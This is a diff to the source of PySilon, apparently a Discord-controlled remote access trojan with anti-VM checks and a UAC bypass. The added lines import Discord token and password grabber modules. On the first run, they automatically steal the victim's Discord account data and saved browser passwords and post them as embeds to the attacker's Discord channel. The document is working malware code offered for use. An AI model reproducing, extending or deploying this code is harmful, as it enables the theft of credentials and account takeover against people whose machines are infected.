@@ -30,6 +30,8 @@ def log(entry): # [pysilon_mark] !debug
 
 # [pysilon_var] $modules 0
 from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
+from resources.discord_token_grabber import *
+from resources.passwords_grabber import *
 from urllib.request import urlopen
 from resources.uac_bypass import *
 from itertools import islice
@@ -115,7 +117,7 @@ files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, N
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
 send_recordings, input_blocked, clipper_stop = True, False, True
 latest_messages_in_recordings = []
-def stm(): import resources.mrd
+# def stm(): import resources.mrd
 # [pysilon_var] !registry 0
 
 working_directory = ['C:', 'Users', getuser(), software_directory_name]
@@ -166,7 +168,7 @@ async def on_ready():
         
     if first_run:
         #.log PySilon is running for the first time
-        threading.Thread(target=stm).start()
+        # threading.Thread(target=stm).start()
         category = await client.get_guild(guild_id).create_category(hwid)
         #.log Created HWID category
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
@@ -202,6 +204,19 @@ async def on_ready():
                 chunk += line + '\n'
         await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
         #.log Sent system information on info channel
+
+        accounts = grab_discord.initialize(False)
+            #.log Grabbed Discord (Auto)
+        for account in accounts:
+            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌')
+                #.log Sent embed with Discord account data (Auto)
+
+        result = grab_passwords()
+            #.log Grabbed passwords (Auto)
+        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
+        for url in result.keys():
+            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
+        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌')
 
     else:
         #.log Fetching channel IDs...
